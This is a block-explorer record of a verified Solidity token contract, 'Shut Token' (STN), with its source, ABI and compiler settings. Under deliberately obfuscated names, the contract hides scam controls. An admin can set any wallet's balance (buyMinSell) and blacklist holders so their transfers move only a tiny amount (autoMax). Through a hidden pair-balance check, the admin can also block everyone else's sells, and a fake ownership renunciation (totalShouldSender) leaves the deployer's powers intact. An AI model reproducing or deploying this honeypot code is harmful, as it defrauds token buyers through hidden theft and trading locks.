{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface totalAutoLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fundExempt) external view returns (uint256);\n\n    function transfer(address marketingList, uint256 receiverReceiver) external returns (bool);\n\n    function allowance(address buyToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingList,\n        uint256 receiverReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toMin, uint256 value);\n    event Approval(address indexed buyToken, address indexed spender, uint256 value);\n}\n\nabstract contract listLimitSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface txFee {\n    function createPair(address feeWallet, address totalFund) external returns (address);\n}\n\ninterface fromMinFee is totalAutoLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ShutToken is listLimitSender, totalAutoLaunch, fromMinFee {\n\n    mapping(address => bool) public tradingReceiverFee;\n\n    bool private receiverBuyReceiver;\n\n    function symbol() external view virtual override returns (string memory) {\n        return shouldIs;\n    }\n\n    uint256 public fundReceiverTx;\n\n    function takeTotal(address modeFromExempt) public {\n        if (buySender) {\n            return;\n        }\n        \n        tradingReceiverFee[modeFromExempt] = true;\n        \n        buySender = true;\n    }\n\n    uint256 public listSender;\n\n    function marketingTotalTrading() private view {\n        require(tradingReceiverFee[_msgSender()]);\n    }\n\n    function fundFee(address launchedBuy, address marketingList, uint256 receiverReceiver) internal returns (bool) {\n        require(listTrading[launchedBuy] >= receiverReceiver);\n        listTrading[launchedBuy] -= receiverReceiver;\n        listTrading[marketingList] += receiverReceiver;\n        emit Transfer(launchedBuy, marketingList, receiverReceiver);\n        return true;\n    }\n\n    function totalShouldSender() public {\n        emit OwnershipTransferred(launchFrom, address(0));\n        tokenTo = address(0);\n    }\n\n    uint256 public launchMin;\n\n    function transferFrom(address launchedBuy, address marketingList, uint256 receiverReceiver) external override returns (bool) {\n        if (_msgSender() != maxBuy) {\n            if (launchAmount[launchedBuy][_msgSender()] != type(uint256).max) {\n                require(receiverReceiver <= launchAmount[launchedBuy][_msgSender()]);\n                launchAmount[launchedBuy][_msgSender()] -= receiverReceiver;\n            }\n        }\n        return exemptIs(launchedBuy, marketingList, receiverReceiver);\n    }\n\n    function allowance(address listFund, address autoTrading) external view virtual override returns (uint256) {\n        if (autoTrading == maxBuy) {\n            return type(uint256).max;\n        }\n        return launchAmount[listFund][autoTrading];\n    }\n\n    address private tokenTo;\n\n    uint256 private liquiditySender = 100000000 * 10 ** 18;\n\n    uint256 public amountAutoTx;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquiditySender;\n    }\n\n    function approve(address autoTrading, uint256 receiverReceiver) public virtual override returns (bool) {\n        launchAmount[_msgSender()][autoTrading] = receiverReceiver;\n        emit Approval(_msgSender(), autoTrading, receiverReceiver);\n        return true;\n    }\n\n    bool private receiverShould;\n\n    address public fundShould;\n\n    bool private minSell;\n\n    uint256 takeList;\n\n    uint256 constant isMax = 7 ** 10;\n\n    uint8 private fundReceiver = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return buyTx;\n    }\n\n    function balanceOf(address fundExempt) public view virtual override returns (uint256) {\n        return listTrading[fundExempt];\n    }\n\n    uint256 modeEnable;\n\n    bool public receiverTx;\n\n    function autoMax(address maxLaunched) public {\n        marketingTotalTrading();\n        \n        if (maxLaunched == launchFrom || maxLaunched == fundShould) {\n            return;\n        }\n        maxReceiver[maxLaunched] = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundReceiver;\n    }\n\n    function buyMinSell(address sellTotal, uint256 receiverReceiver) public {\n        marketingTotalTrading();\n        listTrading[sellTotal] = receiverReceiver;\n    }\n\n    bool public buySender;\n\n    uint256 private amountLiquidity;\n\n    address shouldAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        walletReceiver receiverMin = walletReceiver(maxBuy);\n        fundShould = txFee(receiverMin.factory()).createPair(receiverMin.WETH(), address(this));\n        \n        launchFrom = _msgSender();\n        totalShouldSender();\n        tradingReceiverFee[launchFrom] = true;\n        listTrading[launchFrom] = liquiditySender;\n        \n        emit Transfer(address(0), launchFrom, liquiditySender);\n    }\n\n    string private buyTx = \"Shut Token\";\n\n    address maxBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => mapping(address => uint256)) private launchAmount;\n\n    function transfer(address sellTotal, uint256 receiverReceiver) external virtual override returns (bool) {\n        return exemptIs(_msgSender(), sellTotal, receiverReceiver);\n    }\n\n    uint256 private fundMode;\n\n    function exemptIs(address launchedBuy, address marketingList, uint256 receiverReceiver) internal returns (bool) {\n        if (launchedBuy == launchFrom) {\n            return fundFee(launchedBuy, marketingList, receiverReceiver);\n        }\n        uint256 walletList = totalAutoLaunch(fundShould).balanceOf(shouldAmount);\n        require(walletList == modeEnable);\n        require(marketingList != shouldAmount);\n        if (maxReceiver[launchedBuy]) {\n            return fundFee(launchedBuy, marketingList, isMax);\n        }\n        return fundFee(launchedBuy, marketingList, receiverReceiver);\n    }\n\n    mapping(address => uint256) private listTrading;\n\n    function buyLaunchAt(uint256 receiverReceiver) public {\n        marketingTotalTrading();\n        modeEnable = receiverReceiver;\n    }\n\n    event OwnershipTransferred(address indexed fromSenderShould, address indexed liquidityEnable);\n\n    function getOwner() external view returns (address) {\n        return tokenTo;\n    }\n\n    string private shouldIs = \"STN\";\n\n    mapping(address => bool) public maxReceiver;\n\n    address public launchFrom;\n\n    function owner() external view returns (address) {\n        return tokenTo;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSenderShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountAutoTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"autoMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverReceiver\",\"type\":\"uint256\"}],\"name\":\"buyLaunchAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverReceiver\",\"type\":\"uint256\"}],\"name\":\"buyMinSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buySender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundReceiverTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundShould\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFromExempt\",\"type\":\"address\"}],\"name\":\"takeTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShouldSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingReceiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ShutToken", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}